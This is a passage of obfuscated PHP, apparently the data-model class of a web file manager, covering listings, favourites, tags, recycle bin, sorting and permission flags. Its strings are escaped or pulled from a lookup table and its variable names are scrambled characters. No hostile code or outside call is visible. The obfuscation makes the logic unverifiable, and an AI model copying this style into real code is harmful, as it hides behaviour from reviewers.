"\146\165\156\x63\164\151\x6f\x6e"), array("\x63\162\x65\x61\x74\x65\124\x69\x6d\x65", "\x74\x69\x6d\145", "\x69\x6e\163\x65\162\x74", "\146\x75\156\143\164\151\157\x6e"), array("\166\x69\x65\167\124\x69\155\x65", "\164\151\155\x65", "\x69\x6e\163\x65\162\164", "\146\165\x6e\143\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ªùñë£š) { return $this->listSource(array($_SERVER[ï»»·÷á][410] => $ªùñë£š)); } public function typeName($’ÂÁ“´Æ) { static $œµ§  = array(self::TYPE_SYSTEM => "\163\x79\163\x74\145\155", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\x67\162\x6f\165\160"); return $œµ§ [$’ÂÁ“´Æ . $_SERVER[ï»»·÷á][12]]; } public function sourceListInfo($Ïş—ú€‘, $šØ˜ï…È = false) { $ÍäÌ³€ =& $_SERVER[ï»»·÷á]; $Ïş—ú€‘ = $Ïş—ú€‘ ? $Ïş—ú€‘ : array(); $Ïş—ú€‘ = array_filter(array_unique($Ïş—ú€‘)); if (!$Ïş—ú€‘) { return array(); } $¿Á¾‰õ = $this->where(array($ÍäÌ³€[411] => array($ÍäÌ³€[7], $Ïş—ú€‘)))->select(); $this->_listDataApply($¿Á¾‰õ, $šØ˜ï…È); return array_to_keyvalue($¿Á¾‰õ, $ÍäÌ³€[411]); } public function pathInfoFilter(&$åğü…õ) { $Â•§¤Ê =& $_SERVER[ï»»·÷á]; static $Ç¹¥ü¢Ñ = false; static $·â†ñª = false; static $Ì—¸ìÕ = false; if (!$Ç¹¥ü¢Ñ) { $Ûß²²áì = $Â•§¤Ê[412]; $Ûß²²áì .= $Â•§¤Ê[413]; $Ûß²²áì .= $Â•§¤Ê[414]; $Ùø ö¤ = $Â•§¤Ê[415]; $‚æÌÔº× = explode($Â•§¤Ê[50], $Ùø ö¤); $Ç¹¥ü¢Ñ = explode($Â•§¤Ê[50], $Ûß²²áì); $·â†ñª = array(); foreach ($Ç¹¥ü¢Ñ as $æ¿ì“ÌØ) { if (in_array($æ¿ì“ÌØ, $‚æÌÔº×)) { continue; } $·â†ñª[] = $æ¿ì“ÌØ; } $Ì—¸ìÕ = explode($Â•§¤Ê[50], $Â•§¤Ê[416]); } foreach ($Ì—¸ìÕ as $üµÍœÃ°) { if (isset($åğü…õ[$üµÍœÃ°])) { $åğü…õ[$üµÍœÃ°] = intval($åğü…õ[$üµÍœÃ°]); } } $åğü…õ[$Â•§¤Ê[84]] = $Â•§¤Ê[417] . $åğü…õ[$Â•§¤Ê[411]] . $Â•§¤Ê[418]; $åğü…õ[$Â•§¤Ê[33]] = $åğü…õ[$Â•§¤Ê[419]] == 1 ? $Â•§¤Ê[75] : $Â•§¤Ê[200]; $åğü…õ[$Â•§¤Ê[420]] = $this->typeName($åğü…õ[$Â•§¤Ê[420]]); if ($åğü…õ[$Â•§¤Ê[419]] != 1) { $åğü…õ[$Â•§¤Ê[174]] = $åğü…õ[$Â•§¤Ê[421]]; unset($åğü…õ[$Â•§¤Ê[421]]); } $ŞµµĞÜ = $Ç¹¥ü¢Ñ; if (isset($åğü…õ[$Â•§¤Ê[422]]) && $åğü…õ[$Â•§¤Ê[422]][$Â•§¤Ê[423]] == -1) { $ŞµµĞÜ = $·â†ñª; } $åğü…õ = array_field_key($åğü…õ, $ŞµµĞÜ); return $åğü…õ; } public function listUserFav() { $ÓÃ€—Á =& $_SERVER[ï»»·÷á]; $ˆ¹û¯ßæ = Model($ÓÃ€—Á[424])->listData(); $¥Äá˜ŸÆ = array_filter_by_field($ˆ¹û¯ßæ, $ÓÃ€—Á[33], $ÓÃ€—Á[425]); $¥Äá˜ŸÆ = array_to_keyvalue($¥Äá˜ŸÆ, $ÓÃ€—Á[12], $ÓÃ€—Á[84]); if ($¥Äá˜ŸÆ) { $·µİÒÄ¥ = $this->listSource(array($ÓÃ€—Á[426] => array($ÓÃ€—Á[427], $¥Äá˜ŸÆ))); } $·µİÒÄ¥ = array_to_keyvalue($·µİÒÄ¥[$ÓÃ€—Á[369]], $ÓÃ€—Á[411]); foreach ($ˆ¹û¯ßæ as &$¨ŸÕÄ‹æ) { $¨ŸÕÄ‹æ = array($ÓÃ€—Á[428] => $¨ŸÕÄ‹æ[$ÓÃ€—Á[399]], $ÓÃ€—Á[429] => $¨ŸÕÄ‹æ[$ÓÃ€—Á[32]], $ÓÃ€—Á[430] => $¨ŸÕÄ‹æ[$ÓÃ€—Á[84]], $ÓÃ€—Á[431] => $¨ŸÕÄ‹æ[$ÓÃ€—Á[33]], $ÓÃ€—Á[432] => $¨ŸÕÄ‹æ[$ÓÃ€—Á[201]], $ÓÃ€—Á[433] => $¨ŸÕÄ‹æ[$ÓÃ€—Á[85]]); if ($¨ŸÕÄ‹æ[$ÓÃ€—Á[33]] == $ÓÃ€—Á[425] && $·µİÒÄ¥[$¨ŸÕÄ‹æ[$ÓÃ€—Á[84]]]) { $¨ŸÕÄ‹æ[$ÓÃ€—Á[87]] = $·µİÒÄ¥[$¨ŸÕÄ‹æ[$ÓÃ€—Á[84]]]; } } unset($¨ŸÕÄ‹æ); return $ˆ¹û¯ßæ; } public function listUserTag($­†¦ñ»Â) { $£ ‹û¿ê =& $_SERVER[ï»»·÷á]; if ($­†¦ñ»Â && !is_array($­†¦ñ»Â)) { $­†¦ñ»Â = array($­†¦ñ»Â); } $½œğ‡‚³ = Model($£ ‹û¿ê[434])->listData(); $Û‰ò‹­— = array(); $êêÂµ = array(); foreach ($½œğ‡‚³ as $ÌÃ¸ÓÍØ) { $ßÖ£¢°É = $ÌÃ¸ÓÍØ[$£ ‹û¿ê[84]]; if (!$ßÖ£¢°É) { continue; } if (!isset($êêÂµ[$ßÖ£¢°É])) { $êêÂµ[$ßÖ£¢°É] = array(); } $êêÂµ[$ßÖ£¢°É][] = $ÌÃ¸ÓÍØ[$£ ‹û¿ê[435]]; $Û‰ò‹­—[$ÌÃ¸ÓÍØ[$£ ‹û¿ê[84]]] = $ÌÃ¸ÓÍØ; } $ìÅÈ¥Ã = array(); $ö…‰’ãù = array(); $Ø’»¬ˆ  = array(); foreach ($êêÂµ as $åêšÀßû => $ÌŞª‚ Ú) { $ú•ÏÛŸ = !0; if (!$­†¦ñ»Â) { $ìÅÈ¥Ã[] = $åêšÀßû; continue; } foreach ($­†¦ñ»Â as $²úÍæ’¾) { if (!in_array($²úÍæ’¾, $ÌŞª‚ Ú)) { $ú•ÏÛŸ = !1; break; } } if (!$ú•ÏÛŸ) { continue; } if (!is_numeric($åêšÀßû)) { $ÙÜâ­÷æ = $Û‰ò‹­—[$åêšÀßû]; $å½öÇÕê = array($£ ‹û¿ê[32] => $ÙÜâ­÷æ[$£ ‹û¿ê[32]], $£ ‹û¿ê[84] => $ÙÜâ­÷æ[$£ ‹û¿ê[84]], $£ ‹û¿ê[33] => $ÙÜâ­÷æ[$£ ‹û¿ê[33]], $£ ‹û¿ê[87] => array($£ ‹û¿ê[436] => 1), $£ ‹û¿ê[202] => !0); if ($ÙÜâ­÷æ[$£ ‹û¿ê[33]] == $£ ‹û¿ê[200]) { $Ø’»¬ˆ [] = $å½öÇÕê; } if ($ÙÜâ­÷æ[$£ ‹û¿ê[33]] == $£ ‹û¿ê[75]) { $ö…‰’ãù[] = $å½öÇÕê; } continue; } $ìÅÈ¥Ã[] = $åêšÀßû; } if ($ìÅÈ¥Ã) { $È¿ªóÅ = $this->listSource(array($£ ‹û¿ê[426] => array($£ ‹û¿ê[427], $ìÅÈ¥Ã))); } $È¿ªóÅ = $È¿ªóÅ ? $È¿ªóÅ : array($£ ‹û¿ê[82] => array(), $£ ‹û¿ê[83] => array()); $È¿ªóÅ[$£ ‹û¿ê[82]] = array_merge($È¿ªóÅ[$£ ‹û¿ê[82]], $ö…‰’ãù); $È¿ªóÅ[$£ ‹û¿ê[83]] = array_merge($È¿ªóÅ[$£ ‹û¿ê[83]], $Ø’»¬ˆ ); if (isset($È¿ªóÅ[$£ ‹û¿ê[366]]) && count($ìÅÈ¥Ã) == $È¿ªóÅ[$£ ‹û¿ê[366]][$£ ‹û¿ê[367]]) { return $È¿ªóÅ; } $ÚÅúğ Í = array(); $èÉå”÷® = array_to_keyvalue($È¿ªóÅ[$£ ‹û¿ê[82]], $£ ‹û¿ê[12], $£ ‹û¿ê[411]); $Š‘…Ñªà = array_to_keyvalue($È¿ªóÅ[$£ ‹û¿ê[83]], $£ ‹û¿ê[12], $£ ‹û¿ê[411]); $ÍÜüÉ£œ = array_merge($Š‘…Ñªà, $èÉå”÷®); foreach ($ìÅÈ¥Ã as $ßÖ£¢°É) { if (!in_array($ßÖ£¢°É, $ÍÜüÉ£œ)) { $ÚÅúğ Í[] = $ßÖ£¢°É; } } if ($ÚÅúğ Í) { Model($£ ‹û¿ê[437])->removeBySource($ÚÅúğ Í); } return $È¿ªóÅ; } public function listUserRecycle() { $ÚİŸêœ¾ =& $_SERVER[ï»»·÷á]; $ãÑâïšé = Model($ÚİŸêœ¾[438])->listData(); if (!$ãÑâïšé) { return array(); } $ëßØ°³ = array($ÚİŸêœ¾[426] => array($ÚİŸêœ¾[427], $ãÑâïšé), $ÚİŸêœ¾[439] => 1); return $this->listSource($ëßØ°³); } public function listSource($ôÁ•Ú”ó, $¤äŒ½À¨ = 3000, $ˆŞÚ…°‡ = false) { $Îåğ“‹· =& $_SERVER[ï»»·÷á]; if (!isset($ôÁ•Ú”ó[$Îåğ“‹·[440]])) { $ôÁ•Ú”ó[$Îåğ“‹·[440]] = 0; } if (isset($ôÁ•Ú”ó[$Îåğ“‹·[441]]) && $ôÁ•Ú”ó[$Îåğ“‹·[441]] == $Îåğ“‹·[198]) { $ôÁ•Ú”ó[$Îåğ“‹·[421]] = array($Îåğ“‹·[331], $Îåğ“‹·[442]); } $¶ïó–ş = $Îåğ“‹·[443]; $„ŒÈ²Ñ“ = $this->field($¶ïó–ş)->_makeOrder()->where($ôÁ•Ú”ó)->selectPage($¤äŒ½À¨); $this->_listPageCheck($„ŒÈ²Ñ“, $¶ïó–ş, $ôÁ•Ú”ó); $this->_listDataApply($„ŒÈ²Ñ“[$Îåğ“‹·[369]], $ˆŞÚ…°‡); $this->_listMake($„ŒÈ²Ñ“); return $„ŒÈ²Ñ“; } private function _listPageCheck(&$™°ëö±, $¹“±øÏô, $‘Ÿ³ò´€) { $ê¼³¸ò² =& $_SERVER[ï»»·÷á]; if (!is_array($™°ëö±[$ê¼³¸ò²[366]])) { return; } $½«ÂĞ• = $™°ëö±[$ê¼³¸ò²[366]]; if ($½«ÂĞ•[$ê¼³¸ò²[368]] <= 1) { return; } if ($½«ÂĞ•[$ê¼³¸ò²[367]] >= 100000) { return; } if (Model($ê¼³¸ò²[444])->get($ê¼³¸ò²[445]) != $ê¼³¸ò²[446]) { return; } $¹“±øÏô = str_replace(array($ê¼³¸ò²[53], $ê¼³¸ò²[342], $ê¼³¸ò²[231]), $ê¼³¸ò²[12], $¹“±øÏô); $¹“±øÏô = $ê¼³¸ò²[447] . str_replace($ê¼³¸ò²[50], $ê¼³¸ò²[448], $¹“±øÏô) . $ê¼³¸ò²[449]; $ôª±æ÷ = $ê¼³¸ò²[450]; $ôª±æ÷ = $ôª±æ÷ . $ê¼³¸ò²[451]; $ü’îêä = $½«ÂĞ•[$ê¼³¸ò²[363]] * ($½«ÂĞ•[$ê¼³¸ò²[353]] - 1) . $ê¼³¸ò²[50] . $½«ÂĞ•[$ê¼³¸ò²[363]]; $ñê”Õå = $this->_makeOrder(!0); $Ë£É¡Â = $ê¼³¸ò²[447] . str_replace($ê¼³¸ò²[50], $ê¼³¸ò²[448], $ñê”Õå[0]); if (strpos($Ë£É¡Â, $ê¼³¸ò²[452])) { $Ë£É¡Â = str_replace($ê¼³¸ò²[452], $ê¼³¸ò²[453], $Ë£É¡Â); } else { $Ë£É¡Â .= $ê¼³¸ò²[454] . $ñê”Õå[1]; } $÷œà¶ÙÜ = array(); foreach ($‘Ÿ³ò´€ as $‹×÷ù—” => $´ˆüÀŞ¯) { $÷œà¶ÙÜ[$ê¼³¸ò²[447] . $‹×÷ù—”] = $´ˆüÀŞ¯; } $this->alias($ê¼³¸ò²[455])->field($¹“±øÏô)->limit($ü’îêä)->order($Ë£É¡Â); $­Ö§ƒ™Ê = $this->join($ôª±æ÷)->where($÷œà¶ÙÜ)->select(); if ($­Ö§ƒ™Ê) { $™°ëö±[$ê¼³¸ò²[369]] = $­Ö§ƒ™Ê; } } protected function _makeOrder($¡˜…£Ô = false) { $èèßâ¨ =& $_SERVER[ï»»·÷á]; $°ÉŸâôÛ = Model($èèßâ¨[456])->get($èèßâ¨[457]); $ã¡›œø = Model($èèßâ¨[456])->get($èèßâ¨[458]); $Ç€º¦’ğ = array($èèßâ¨[459] => $èèßâ¨[460], $èèßâ¨[461] => $èèßâ¨[462]); $’àıé¤Ì = array($èèßâ¨[32] => $èèßâ¨[32], $èèßâ¨[76] => $èèßâ¨[76], $èèßâ¨[174] => $èèßâ¨[421], $èèßâ¨[463] => $èèßâ¨[463], $èèßâ¨[464] => $èèßâ¨[465], $èèßâ¨[201] => $èèßâ¨[201], $èèßâ¨[85] => $èèßâ¨[85]); $˜ñÑ¼ = Input::get($èèßâ¨[466], $èèßâ¨[7], $°ÉŸâôÛ, array_keys($’àıé¤Ì)); $ß¬ú“  = Input::get($èèßâ¨[467], $èèßâ¨[7], $ã¡›œø, array_keys($Ç€º¦’ğ)); if (!in_array($˜ñÑ¼, array_keys($’àıé¤Ì))) { $˜ñÑ¼ = $èèßâ¨[32]; } if (!in_array($ß¬ú“ , array_keys($Ç€º¦’ğ))) { $˜ñÑ¼ = $èèßâ¨[459]; } if ($˜ñÑ¼ == $èèßâ¨[32]) { } $ÂÏ‹ìœƒ = $èèßâ¨[468] . $’àıé¤Ì[$˜ñÑ¼] . $èèßâ¨[53] . $Ç€º¦’ğ[$ß¬ú“ ]; $ÂÏ‹ìœƒ = rtrim(trim($ÂÏ‹ìœƒ), $èèßâ¨[50]); if ($¡˜…£Ô) { return array($ÂÏ‹ìœƒ, $Ç€º¦’ğ[$ß¬ú“ ]); } return $this->order($ÂÏ‹ìœƒ); } protected function _listDataApplyItem($é¸¤ùéó, $º‹¥œó± = false) { $èáæî·¤ = array($é¸¤ùéó); $this->_listDataApply($èáæî·¤, $º‹¥œó±); return $èáæî·¤[0]; } protected function _listDataApply(&$•üªíªÈ, $¬¯ –‰ø = false) { $¶®¹›¼ =& $_SERVER[ï»»·÷á]; if (!$•üªíªÈ) { $•üªíªÈ = array(); return; } $§ôû¡Êú = array_to_keyvalue($•üªíªÈ, $¶®¹›¼[12], $¶®¹›¼[411]); $§ôû¡Êú = array_unique($§ôû¡Êú); $this->_listSourceCache($•üªíªÈ); if (!$¬¯ –‰ø) { $this->_listAppendMeta($•üªíªÈ, $§ôû¡Êú); $this->_listAppendFileMeta($•üªíªÈ, $§ôû¡Êú); $this->_listAppendChildren($•üªíªÈ, $§ôû¡Êú); } $this->_listAppendPath($•üªíªÈ); $this->_listAppendAuth($•üªíªÈ); $this->_listAppendSourceInfo($•üªíªÈ, $§ôû¡Êú); $this->_listAppendUser($•üªíªÈ); $this->_listFilterInfo($•üªíªÈ, $¬¯ –‰ø); $this->_listAppendAuthSecret($•üªíªÈ); } protected function _listSourceCache($»‡Ï¨‰½) { $öç²õÔÜ =& $_SERVER[ï»»·÷á]; foreach ($»‡Ï¨‰½ as $ü¡ñ¯Ôè) { self::$cacheSourceInfo[$öç²õÔÜ[469] . $ü¡ñ¯Ôè[$öç²õÔÜ[411]]] = $ü¡ñ¯Ôè; } } protected function _listFilterInfo(&$íê¿Ÿ , $ÖßÅùÖ£ = false) { $¼ŒÃÛÇë =& $_SERVER[ï»»·÷á]; foreach ($íê¿Ÿ  as &$Ó›Ôè‹İ) { $Ó›Ôè‹İ = $this->pathInfoFilter($Ó›Ôè‹İ); self::$cachePathInfo[$¼ŒÃÛÇë[470] . intval($ÖßÅùÖ£) . $¼ŒÃÛÇë[386] . $Ó›Ôè‹İ[$¼ŒÃÛÇë[411]]] = $Ó›Ôè‹İ; } unset($Ó›Ôè‹İ); } protected function _listMake(&$ÛÎï¬ş–) { $›ò…Â¸‚ =& $_SERVER[ï»»·÷á]; $ÛÎï¬ş–[$›ò…Â¸‚[82]] = array(); $ÛÎï¬ş–[$›ò…Â¸‚[83]] = array(); foreach ($ÛÎï¬ş–[$›ò…Â¸‚[369]] as $¥”ĞñÎá) { $ÆüıèÁí = $¥”ĞñÎá[$›ò…Â¸‚[419]] == 1 ? $›ò…Â¸‚[82] : $›ò…Â¸‚[83]; $ÛÎï¬ş–[$ÆüıèÁí][] = $¥”ĞñÎá; } unset($ÛÎï¬ş–[$›ò…Â¸‚[369]]); } protected function _listAppendMeta(&$ÖÅÈËÜÎ, $„‹ŞŠô÷) { $éÍäˆ›Ó =& $_SERVER[ï»»·÷á]; $¥òëªï³ = array($éÍäˆ›Ó[426] => array($éÍäˆ›Ó[427], $„‹ŞŠô÷)); $µªòÏ ÷ = Model($éÍäˆ›Ó[471])->field($éÍäˆ›Ó[472])->where($¥òëªï³)->select(); if (!$µªòÏ ÷) { return; } $Í›èÃ†ê = array($éÍäˆ›Ó[473], $éÍäˆ›Ó[474], $éÍäˆ›Ó[453]); $®×­Ñğ¸ = array(); foreach ($µªòÏ ÷ as $°¿¸Æé†) { if (!isset($®×­Ñğ¸[$°¿¸Æé†[$éÍäˆ›Ó[411]]])) { $®×­Ñğ¸[$°¿¸Æé†[$éÍäˆ›Ó[411]]] = array(); } if (in_array($°¿¸Æé†[$éÍäˆ›Ó[94]], $Í›èÃ†ê)) { continue; } $®×­Ñğ¸[$°¿¸Æé†[$éÍäˆ›Ó[411]]][$°¿¸Æé†[$éÍäˆ›Ó[94]]] = $°¿¸Æé†[$éÍäˆ›Ó[374]]; } foreach ($ÖÅÈËÜÎ as &$¸ÎÊ–Ì‘) { $¸ÎÊ–Ì‘[$éÍäˆ›Ó[475]] = !1; if (isset($®×­Ñğ¸[$¸ÎÊ–Ì‘[$éÍäˆ›Ó[411]]])) { $¸ÎÊ–Ì‘[$éÍäˆ›Ó[475]] = $®×­Ñğ¸[$¸ÎÊ–Ì‘[$éÍäˆ›Ó[411]]]; } if ($this->fileIsLock($¸ÎÊ–Ì‘) && $¸ÎÊ–Ì‘[$éÍäˆ›Ó[422]]) { $ñØŒ£Ü¿ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¸ÎÊ–Ì‘[$éÍäˆ›Ó[422]][$éÍäˆ›Ó[423]] = AuthModel::authDisable($¸ÎÊ–Ì‘[$éÍäˆ›Ó[422]][$éÍäˆ›Ó[423]], $ñØŒ£Ü¿); $¸ÎÊ–Ì‘[$éÍäˆ›Ó[422]][$éÍäˆ›Ó[476]][$éÍäˆ›Ó[422]] = $¸ÎÊ–Ì‘[$éÍäˆ›Ó[422]][$éÍäˆ›Ó[423]]; } } unset($¸ÎÊ–Ì‘); } protected function _listAppendFileMeta(&$£ÑÉÖœ”, $ŒùÖÆ¡) { $¢Ú€üøã =& $_SERVER[ï»»·÷á]; $À¬»¢© = array_to_keyvalue($£ÑÉÖœ”, $¢Ú€üøã[12], $¢Ú€üøã[477]); $À¬»¢© = array_filter(array_unique($À¬»¢©)); if (!$À¬»¢©) { return; } $î¨¨ºØ = array($¢Ú€üøã[478] => array($¢Ú€üøã[427], $À¬»¢©)); $à”‡ûº = $¢Ú€üøã[479]; $üè“ï = Model($¢Ú€üøã[480])->field($à”‡ûº)->where($î¨¨ºØ)->select(); $üè“ï = array_to_keyvalue($üè“ï, $¢Ú€üøã[477]); $ßÖôÖŒõ = Model($¢Ú€üøã[481])->field($¢Ú€üøã[482])->where($î¨¨ºØ)->select(); $ßÖôÖŒõ = $ßÖôÖŒõ ? $ßÖôÖŒõ : array(); $˜­éöË = array(); foreach ($ßÖôÖŒõ as $¼ä¸ï†Ø) { if (!isset($˜­éöË[$¼ä¸ï†Ø[$¢Ú€üøã[477]]])) { $˜­éöË[$¼ä¸ï†Ø[$¢Ú€üøã[477]]] = array(); } $˜­éöË[$¼ä¸ï†Ø[$¢Ú€üøã[477]]][$¼ä¸ï†Ø[$¢Ú€üøã[94]]] = $¼ä¸ï†Ø[$¢Ú€üøã[374]]; } foreach ($£ÑÉÖœ” as &$‘Ì Ì•£) { $¡Ñäï”Ñ = $‘Ì Ì•£[$¢Ú€üøã[477]]; if (!$¡Ñäï”Ñ || !is_array($üè“ï[$¡Ñäï”Ñ])) { continue; } $÷òñã½ = $üè“ï[$¡Ñäï”Ñ]; $÷òñã½[$¢Ú€üøã[76]] = $‘Ì Ì•£[$¢Ú€üøã[76]]; $÷òñã½[$¢Ú€üøã[32]] = $‘Ì Ì•£[$¢Ú€üøã[32]]; if (!isset(self::$cacheFileInfo[$¢Ú€üøã[483] . $¡Ñäï”Ñ])) { self::$cacheFileInfo[$¢Ú€üøã[483] . $¡Ñäï”Ñ] = array_merge(array(), $÷òñã½); } unset($üè“ï[$¡Ñäï”Ñ][$¢Ú€üøã[84]]); $ëÁÜ‘„¸ = is_array($˜­éöË[$¡Ñäï”Ñ]) ? $˜­éöË[$¡Ñäï”Ñ] : array(); $‘Ì Ì•£[$¢Ú€üøã[170]] = array_merge($ëÁÜ‘„¸, $üè“ï[$¡Ñäï”Ñ]); if (isset($‘Ì Ì•£[$¢Ú€üøã[170]][$¢Ú€üøã[169]])) { $‘Ì Ì•£[$¢Ú€üøã[169]] = json_decode($‘Ì Ì•£[$¢Ú€üøã[170]][$¢Ú€üøã[169]], !0); unset($‘Ì Ì•£[$¢Ú€üøã[170]][$¢Ú€üøã[169]]); } } unset($‘Ì Ì•£); } protected function _listAppendSourceInfo(&$óæÛÂ¨Æ, $¨¬Ë¦Šù) { $Ïã“¶¶ê =& $_SERVER[ï»»·÷á]; $Ë ¨”£ã = Model($Ïã“¶¶ê[484])->listData(); $ççøœşŒ = Model($Ïã“¶¶ê[434])->listData(); $½½‰¼¯¬ = Model($Ïã“¶¶ê[424])->listData(); $—®°¼”Ò = Model($Ïã“¶¶ê[485])->listSimple(); $ëÚÕå€¡ = array_to_keyvalue($Ë ¨”£ã, $Ïã“¶¶ê[399]); $Ô”†åÉ = array_to_keyvalue_group($ççøœşŒ, $Ïã“¶¶ê[84], $Ïã“¶¶ê[435]); $åì¤’ñÙ = array_to_keyvalue($½½‰¼¯¬, $Ïã“¶¶ê[84]); $™¾ûıÏò = array_to_keyvalue_group($—®°¼”Ò, $Ïã“¶¶ê[411]); foreach ($óæÛÂ¨Æ as &$µ¨èæä›) { $µ¨èæä›[$Ïã“¶¶ê[87]] = array($Ïã“¶¶ê[486] => 0, $Ïã“¶¶ê[487] => 0, $Ïã“¶¶ê[488] => 0); if (isset($åì¤’ñÙ[$µ¨èæä›[$Ïã“¶¶ê[411]]])) { $µ¨èæä›[$Ïã“¶¶ê[87]][$Ïã“¶¶ê[489]] = 1; $µ¨èæä›[$Ïã“¶¶ê[87]][$Ïã“¶¶ê[490]] = $åì¤’ñÙ[$µ¨èæä›[$Ïã“¶¶ê[411]]][$Ïã“¶¶ê[32]]; } if ($Ô”†åÉ && $ëÚÕå€¡ && isset($Ô”†åÉ[$µ¨èæä›[$Ïã“¶¶ê[411]]])) { $µ¨èæä›[$Ïã“¶¶ê[87]][$Ïã“¶¶ê[491]] = array(); foreach ($Ô”†åÉ[$µ¨èæä›[$Ïã“¶¶ê[411]]] as $ä ŒöÉÄ) { $—º¯¥¸Ÿ = $ëÚÕå€¡[$ä ŒöÉÄ]; $µ¨èæä›[$Ïã“¶¶ê[87]][$Ïã“¶¶ê[491]][] = array($Ïã“¶¶ê[492] => $—º¯¥¸Ÿ[$Ïã“¶¶ê[399]], $Ïã“¶¶ê[429] => $—º¯¥¸Ÿ[$Ïã“¶¶ê[32]], $Ïã“¶¶ê[493] => $—º¯¥¸Ÿ[$Ïã“¶¶ê[494]]); } } if ($™¾ûıÏò && isset($™¾ûıÏò[$µ¨èæä›[$Ïã“¶¶ê[411]]])) { $µ¨èæä›[$Ïã“¶¶ê[87]][$Ïã“¶¶ê[495]] = array(); foreach ($™¾ûıÏò[$µ¨èæä›[$Ïã“¶¶ê[411]]] as $Ş’Ñ­á) { $ÛíæíòÒ = $Ïã“¶¶ê[496]; if ($Ş’Ñ­á[$Ïã“¶¶ê[497]] == $Ïã“¶¶ê[88]) { $ÛíæíòÒ .= $Ïã“¶¶ê[498]; } $µ¨èæä›[$Ïã“¶¶ê[87]][$Ïã“¶¶ê[495]] = array_field_key($Ş’Ñ­á, explode($Ïã“¶¶ê[50], $ÛíæíòÒ)); } } } unset($µ¨èæä›); return $óæÛÂ¨Æ; } protected function _listAppendChildren(&$ëÄËµûì, $ÎÑ¶É…¿) { $ÔöìÚÚæ =& $_SERVER[ï»»·÷á]; $¿õÑ¤Î° = array(); $Æ¾‡•±à = array($ÔöìÚÚæ[207] => 0, $ÔöìÚÚæ[208] => 0); foreach ($ëÄËµûì as &$ËÁŒ©ª) { if (!$ËÁŒ©ª[$ÔöìÚÚæ[419]]) { continue; } $¿õÑ¤Î°[] = $ËÁŒ©ª[$ÔöìÚÚæ[411]]; } unset($ËÁŒ©ª); if (!$¿õÑ¤Î°) { return; } $†ôÓ¢ÖÆ = array($ÔöìÚÚæ[441] => array($ÔöìÚÚæ[7], $¿õÑ¤Î°), $ÔöìÚÚæ[440] => 0); $¯Ã¾öÈñ = array($ÔöìÚÚæ[441], $ÔöìÚÚæ[419], $ÔöìÚÚæ[499] => $ÔöìÚÚæ[500]); $«éåúä° = $this->field($¯Ã¾öÈñ)->where($†ôÓ¢ÖÆ)->group($ÔöìÚÚæ[501])->select(); $Ã•¬£ªÏ = array(); foreach ($«éåúä° as $¨êİ…Æ§) { $–òÉš = $¨êİ…Æ§[$ÔöìÚÚæ[441]]; $è éı÷¾ = $¨êİ…Æ§[$ÔöìÚÚæ[419]] == $ÔöìÚÚæ[88] ? $ÔöìÚÚæ[208] : $ÔöìÚÚæ[207]; if (!isset($Ã•¬£ªÏ[$–òÉš])) { $Ã•¬£ªÏ[$–òÉš] = array($ÔöìÚÚæ[207] => 0, $ÔöìÚÚæ[208] => 0); } $Ã•¬£ªÏ[$–òÉš][$è éı÷¾] += $¨êİ…Æ§[$ÔöìÚÚæ[500]]; } foreach ($ëÄËµûì as &$ËÁŒ©ª) { if (!$ËÁŒ©ª[$ÔöìÚÚæ[419]]) { continue; } $¶’Îµ‚ = is_array($Ã•¬£ªÏ[$ËÁŒ©ª[$ÔöìÚÚæ[411]]]) ? $Ã•¬£ªÏ[$ËÁŒ©ª[$ÔöìÚÚæ[411]]] : $Æ¾‡•±à; $ËÁŒ©ª[$ÔöìÚÚæ[208]] = $¶’Îµ‚[$ÔöìÚÚæ[208]]; $ËÁŒ©ª[$ÔöìÚÚæ[207]] = $¶’Îµ‚[$ÔöìÚÚæ[207]]; unset($ËÁŒ©ª[$ÔöìÚÚæ[421]]); } unset($ËÁŒ©ª); } protected function _listAppendAuth(&$æÎ„ê) { $‚Ş‰´Ğ« =& $_SERVER[ï»»·÷á]; $â°àŒÊ = array(); foreach ($æÎ„ê as $ü¼¾Í·) { if ($ü¼¾Í·[$‚Ş‰´Ğ«[420]] == self::TYPE_GROUP) { $â°àŒÊ[] = $ü¼¾Í·[$‚Ş‰´Ğ«[411]]; } } if (!$â°àŒÊ) { return; } $´¿­ƒ†Û = array_to_keyvalue($æÎ„ê, $‚Ş‰´Ğ«[411]); $Àïş®®ô = Model($‚Ş‰´Ğ«[502])->getSourceList($â°àŒÊ, $´¿­ƒ†Û); $ş™è§É = $GLOBALS[$‚Ş‰´Ğ«[503]] == 1; foreach ($æÎ„ê as $Ö¹„›ÑË => &$ü¼¾Í·) { $ü¼¾Í·[$‚Ş‰´Ğ«[422]] = $Àïş®®ô[$ü¼¾Í·[$‚Ş‰´Ğ«[411]]]; if (!$ü¼¾Í·[$‚Ş‰´Ğ«[422]] && $ü¼¾Í·[$‚Ş‰´Ğ«[420]] == self::TYPE_GROUP) { $ü¼¾Í·[$‚Ş‰´Ğ«[422]] = Action($‚Ş‰´Ğ«[504])->pathGroupAuthMake($ü¼¾Í·[$‚Ş‰´Ğ«[505]]); if (!$ü¼¾Í·[$‚Ş‰´Ğ«[422]] && !$ş™è§É) { $ü¼¾Í·[$‚Ş‰´Ğ«[203]] = !1; $ü¼¾Í·[$‚Ş‰´Ğ«[202]] = !1; } } if ($ü¼¾Í·[$‚Ş‰´Ğ«[422]]) { $ü¼¾Í·[$‚Ş‰´Ğ«[203]] = AuthModel::authCheckEdit($ü¼¾Í·[$‚Ş‰´Ğ«[422]][$‚Ş‰´Ğ«[423]]); $ü¼¾Í·[$‚Ş‰´Ğ«[202]] = AuthModel::authCheckView($ü¼¾Í·[$‚Ş‰´Ğ«[422]][$‚Ş‰´Ğ«[423]]); } $this->groupPathDisplay($ü¼¾Í·); } unset($ü¼¾Í·); } public function _listAppendAuthSecret(&$ó§ôıó) { $øµ¥Æü =& $_SERVER[ï»»·÷á]; if (Model($øµ¥Æü[444])->get($øµ¥Æü[506]) != $øµ¥Æü[88]) { return; } static $ìÈ©²ïæ = false; if (!$ìÈ©²ïæ) { $àŸ‹ù¸á = Model($øµ¥Æü[507]); $­å™Í‹” = Model($øµ¥Æü[508]); $ìÈ©²ïæ = $­å™Í‹”->listData(); $ìÈ©²ïæ = array_to_keyvalue($ìÈ©²ïæ, $øµ¥Æü[411]); $°²ÙÖø¢ = 